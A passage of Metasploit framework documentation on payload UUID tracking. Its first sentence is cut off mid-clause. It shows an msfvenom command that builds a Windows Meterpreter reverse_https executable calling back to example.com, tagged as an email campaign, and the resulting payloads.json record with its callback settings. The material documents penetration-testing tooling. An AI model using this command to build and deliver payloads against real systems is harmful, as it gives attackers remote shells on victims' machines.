### Specifying the UUID
Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the
```
$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe

$ cat ~/.msf4/payloads.json
{
  "68017d72958c40f6": {
    "arch": "x86",
    "platform": "windows",
    "timestamp": 1435277049,
    "payload": "payload/windows/meterpreter/reverse_https",
    "datastore": {"AutoLoadStdapi":true,"AutoRunScript":"","AutoSystemInfo":true,"AutoVerifySession":true,"AutoVerifySessionTimeout":30,"EXITFUNC":"process","EnableStageEncoding":false,"EnableUnicodeEncoding":false,"HttpUnknownRequestResponse":"\u003Chtml\u003E\u003Cbody\u003E\u003Ch1\u003EIt works!\u003C/h1\u003E\u003C/body\u003E\u003C/html\u003E","IgnoreUnknownPayloads":false,"InitialAutoRunScript":"","LHOST":"127.1.1.1","LPORT":4444,"MeterpreterServerName":"Apache","MeterpreterUserAgent":"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)","OverrideRequestHost":false,"PAYLOADUUIDNAME":"EmailCampaign20150101","PayloadProxyPort":0,"PayloadProxyType":"HTTP","PayloadUUIDTracking":true,"PrependMigrate":false,"ReverseListenerBindPort":0,"SessionCommunicationTimeout":300,"SessionExpirationTimeout":604800,"SessionRetryTotal":3600,"SessionRetryWait":10,"StageEncoderSaveRegisters":"","StageEncodingFallback":true,"StagerRetryCount":10,"StagerURILength":0,"StagerVerifySSLCert":false,"VERBOSE":false},
    "name": "EmailCampaign20150101",
    "urls": [
  "/aAF9cpWMQPb-3f_cq1FoJA040uMw26kAnvroJdztpVzDrNpqbpT7t3DyYy0cR2TyQE87XxHgIOKiYwP2FJNlNjrBXWQNiGWtzUK1ueJ0DyFjCXmULVo_gGrvi"
]
}
}
```



